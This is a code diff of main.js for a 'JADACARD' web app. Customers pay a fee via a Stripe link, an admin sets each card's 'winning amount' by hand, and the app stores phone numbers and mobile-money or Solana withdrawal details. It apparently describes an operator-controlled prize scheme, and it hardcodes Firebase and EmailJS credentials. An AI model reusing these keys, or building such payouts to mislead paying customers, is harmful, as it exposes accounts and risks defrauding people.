@@ -1,14 +1,14 @@
 
 // ==========================================
-// JADACARD - main.js
-// Firebase + EmailJS + Admin Functions
+// JADACARD - main.js PART 1
+// Firebase + EmailJS + Admin Control
+// No app payments - Stripe link only
 // ==========================================
 
-// 1. IMPORTS
 import { initializeApp } from "firebase/app";
-import { getFirestore, collection, addDoc, getDocs, updateDoc, doc } from "firebase/firestore";
+import { getFirestore, collection, addDoc, updateDoc, doc, onSnapshot, query, orderBy } from "firebase/firestore";
 
-// 2. FIREBASE CONFIG
+// FIREBASE CONFIG - YOURS
 const firebaseConfig = {
   apiKey: "AIzaSyB5jGFyvFxHY4mlejAvSerYkqqHq_J7YKQ",
   authDomain: "jada-card.firebaseapp.com",
@@ -18,77 +18,70 @@ const firebaseConfig = {
   appId: "1:658789024478:web:78b85f82d87e9cdbf4b84f"
 };
 
-// 3. INIT FIREBASE
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-// 4. INIT EMAILJS
+// EMAILJS INIT - YOURS
 emailjs.init("I12UIAChWa_pR03-M");
 
 // ==========================================
-// CUSTOMER FUNCTIONS
+// 1. CUSTOMER TAPS "PAY FOR CARD" 
+// Card issued as PENDING immediately, whether they pay on Stripe or not
+// All details go to admin panel + email alert
 // ==========================================
-
-/**
- * Save customer when they tap "Pay for Card"
- * Sends email alert to admin + saves to Firebase
- */
-export async function saveCustomer(customerData) {
+export async function logCustomerAttempt(customerData) {
   try {
-    // 1. Save to Firebase - status pending, winningAmount 0
     const docRef = await addDoc(collection(db, "customers"), {
       name: customerData.name,
       phone: customerData.phone,
-      email: customerData.email,
-      cardNumber: customerData.cardNumber,
-      amountPaid: customerData.amountPaid || 0,
-      status: "pending",
-      winningAmount: 0,
-      date: new Date()
+      email: customerData.email || '',
+      cardNumber: 'CARD-' + Date.now(),
+      amountPaid: customerData.amountPaid || 5000, // Your ticket price
+      status: "pending", // Pending until you approve
+      winningAmount: 0,  // You set this manually
+      withdrawalMethod: "", // MTN, 【entity-Airtel¦canonical_name=Airtel】, Solana
+      withdrawalDetails: "", // Phone number or wallet address
+      tappedPayAt: new Date(),
+      approvedAt: null
     });
 
-    // 2. Send email alert to admin
+    // Send email alert to admin instantly
     await emailjs.send("service_93u3", "template_8lpidat", {
       customer_name: customerData.name,
       customer_phone: customerData.phone,
-      customer_email: customerData.email,
-      card_number: customerData.cardNumber,
-      amount_paid: customerData.amountPaid || 0,
-      time: new Date().toLocaleString()
+      customer_email: customerData.email || 'No email',
+      card_number: 'CARD-' + Date.now(),
+      amount_paid: customerData.amountPaid || 5000,
+      time: new Date().toLocaleString(),
+      message: 'Customer tapped Pay for Card. Check Stripe to confirm payment.'
     });
 
-    console.log("Customer saved + Email sent. ID:", docRef.id);
+    console.log("Customer logged. ID:", docRef.id);
     return docRef.id;
     
   } catch (error) {
-    console.error("Error saving customer:", error);
+    console.error("Error logging customer:", error);
     throw error;
   }
 }
 
 // ==========================================
-// ADMIN FUNCTIONS
+// 2. ADMIN: Get all customers in real-time
+// Shows everyone who tapped "Pay" whether they paid Stripe or not
 // ==========================================
-
-/**
- * Get all customers for admin panel
- */
-export async function getAllCustomers() {
-  try {
-    const snapshot = await getDocs(collection(db, "customers"));
-    return snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
-  } catch (error) {
-    console.error("Error getting customers:", error);
-    return [];
-  }
+export function getAllCustomersRealtime(callback) {
+  const q = query(collection(db, "customers"), orderBy("tappedPayAt", "desc"));
+  onSnapshot(q, (snapshot) => {
+    const customers = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
+    callback(customers);
+  });
 }
 
-/**
- * Approve customer - Admin sets winning amount manually
- * @param {string} customerId - Firebase doc ID
- * @param {number} amount - Amount admin types
- */
-export async function approveWithAmount(customerId, amount) {
+// ==========================================
+// 3. ADMIN: Approve customer with manual winning amount
+// ✅ Button → Card becomes ACTIVE, user can tap to see amount
+// ==========================================
+export async function approveCustomer(customerId, amount) {
   try {
     if (!amount || amount <= 0) {
       throw new Error("Enter winning amount first!");
@@ -96,7 +89,8 @@ export async function approveWithAmount(customerId, amount) {
     
     await updateDoc(doc(db, "customers", customerId), { 
       status: "active",
-      winningAmount: parseInt(amount)
+      winningAmount: parseInt(amount),
+      approvedAt: new Date()
     });
     
     console.log(`Customer ${customerId} approved with UGX ${amount}`);
@@ -107,10 +101,10 @@ export async function approveWithAmount(customerId, amount) {
   }
 }
 
-/**
- * Reject customer - Card disappears
- * @param {string} customerId - Firebase doc ID
- */
+// ==========================================
+// 4. ADMIN: Reject customer
+// ❎ Button → Card disappears, user area becomes normal
+// ==========================================
 export async function rejectCustomer(customerId) {
   try {
     await updateDoc(doc(db, "customers", customerId), { 
@@ -125,5 +119,21 @@ export async function rejectCustomer(customerId) {
   }
 }
 
-// Export Firebase app if needed
+// ==========================================
+// 5. CUSTOMER: Save withdrawal details
+// MTN, Airtel, or Solana wallet address
+// ==========================================
+export async function saveWithdrawalDetails(customerId, method, details) {
+  try {
+    await updateDoc(doc(db, "customers", customerId), {
+      withdrawalMethod: method,
+      withdrawalDetails: details
+    });
+    console.log(`Withdrawal details saved for ${customerId}`);
+  } catch (error) {
+    console.error("Error saving withdrawal:", error);
+    throw error;
+  }
+}
+
 export { app };
